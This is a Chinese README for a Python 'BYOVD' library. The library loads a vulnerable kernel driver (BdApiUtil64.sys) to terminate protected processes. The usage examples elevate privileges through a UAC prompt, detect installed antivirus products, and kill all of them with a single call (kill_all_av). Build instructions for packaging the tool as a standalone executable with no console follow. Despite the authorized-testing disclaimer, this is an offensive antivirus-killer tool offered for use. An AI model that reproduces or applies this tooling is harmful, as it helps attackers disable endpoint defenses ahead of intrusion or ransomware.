# BYOVD Library

⚠️ **安全警告**：本库仅供授权的安全测试、渗透测试和教育工作使用。

---

## 目录结构

```
BYOVD/
├── byovd_lib.py          # 单文件库
├── byovd_process_terminator.py  # 进程终止工具
├── build.py              # Nuitka 编译脚本
├── examples/             # 使用示例
│   └── demo.py
├── docs/                 # 文档
│   ├── API.md
│   └── BUILD.md          # 编译指南
├── README.md             # 本文件
└── BdApiUtil64.sys       # 驱动文件
```

---

## 快速开始

### 1. 安装依赖

```bash
pip install pywin32 psutil
```

### 2. 基本使用

```python
from byovd_lib import BYOVD

# 使用上下文管理器（推荐）
with BYOVD() as byovd:
    # 终止进程
    byovd.kill(1234)
    
    # 列出进程
    for pid, name in byovd.list_processes():
        print(f"{pid}: {name}")
    
    # 检测杀毒软件
    for pid, name, av in byovd.detect_av():
        print(f"{av}: {name}")
```

### 3. 自动提权 + 一键终结杀软

```python
from byovd_lib import request_elevation, kill_all_av

# 自动请求管理员权限（弹出 UAC 对话框）
request_elevation()

# 一键识别并终结所有杀毒软件
results = kill_all_av()
for pid, name, av, success, msg in results:
    print(f"[{'+' if success else '-'}] {av} ({name}, PID: {pid}): {msg}")
```

---

## API 接口

### 便捷函数

| 功能 | 方法 | 说明 |
|------|------|------|
| 自动提权 | `request_elevation()` | 请求 UAC 管理员权限，自动重启脚本 |
| 一键终结杀软 | `kill_all_av(verbose=True)` | 自动识别并终结所有杀毒软件进程 |

### BYOVD 类方法

| 功能 | 方法 | 示例 |
|------|------|------|
| 终止进程 (PID) | `kill(pid)` | `byovd.kill(1234)` |
| 终止进程 (名称) | `kill_by_name(name)` | `byovd.kill_by_name("notepad.exe")` |
| 列出进程 | `list_processes()` | `byovd.list_processes()` |
| 查找进程 | `get_process_by_name(name)` | `byovd.get_process_by_name("chrome")` |
| 检测杀毒软件 | `detect_av()` | `byovd.detect_av()` |
| 检查杀毒软件 | `has_av(name)` | `byovd.has_av("火绒")` |
| 加载驱动 | `load_driver()` | `byovd.load_driver()` |
| 卸载驱动 | `unload_driver()` | `byovd.unload_driver()` |
| 检查驱动 | `is_driver_loaded()` | `byovd.is_driver_loaded()` |

---

## 完整示例

```python
from byovd_lib import BYOVD

def main():
    with BYOVD() as byovd:
        print("=== 进程列表 ===")
        for pid, name in byovd.list_processes()[:10]:
            print(f"  {pid}: {name}")
        
        print("\n=== 杀毒软件检测 ===")
        av_list = byovd.detect_av()
        if av_list:
            for pid, name, av in av_list:
                print(f"  {av}: {name} (PID: {pid})")
        else:
            print("  未检测到杀毒软件")

if __name__ == "__main__":
    main()
```

---

## 运行示例

```bash
python examples/demo.py
```

---

## 编译为可执行文件

本项目使用 **Nuitka** 将 Python 程序编译为独立的可执行文件。

### 安装 Nuitka

```bash
pip install nuitka zstandard ordered-set
```

### 使用方法

```bash
# 编译所有文件
python build.py

# 编译单个文件
python build.py --file examples/demo.py --output BYOVD_Demo

# 查看可编译文件列表
python build.py --list
```

### 编译选项

| 选项 | 说明 |
|------|------|
| `--file`, `-f` | 要编译的 Python 文件 |
| `--output`, `-o` | 输出文件名 |
| `--gui` | 编译为 GUI 程序（无控制台） |
| `--all`, `-a` | 编译所有配置的文件 |
| `--list`, `-l` | 列出可编译的文件 |

详细编译指南请参阅 `docs/BUILD.md`。

---

## 注意事项

1. **管理员权限**: 必须以管理员权限运行，可使用 `request_elevation()` 自动请求
2. **驱动文件**: 确保 `BdApiUtil64.sys` 存在于库目录或当前目录
3. **资源清理**: 使用 `with` 语句或手动调用 `close()`
4. **杀软终结**: `kill_all_av()` 会终止所有检测到的杀毒软件进程

---

## 文档

详细 API 文档请参阅 `docs/API.md`。

---

## 免责声明

本库仅供安全研究和教育目的使用。使用者对自己的行为承担全部法律责任。